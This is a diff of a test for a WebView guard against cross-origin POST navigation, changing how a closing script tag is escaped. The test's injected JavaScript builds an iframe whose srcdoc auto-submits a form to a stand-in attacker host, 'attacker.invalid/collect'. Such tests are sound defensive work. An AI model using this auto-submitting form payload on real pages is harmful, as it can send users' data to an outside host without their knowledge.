@@ -127,7 +127,7 @@ class SafeWebViewPostOriginGuardTest {
                             """
                             (function () {
                                 const frame = document.createElement('iframe');
-                                frame.srcdoc = '<base target="_top"><form id="f" method="POST" action="https://attacker.invalid/collect"></form><script>document.getElementById("f").submit();<\\/script>';
+                                frame.srcdoc = '<base target="_top"><form id="f" method="POST" action="https://attacker.invalid/collect"></form><script>document.getElementById("f").submit();<\/script>';
                                 document.body.appendChild(frame);
                                 return true;
                             })();
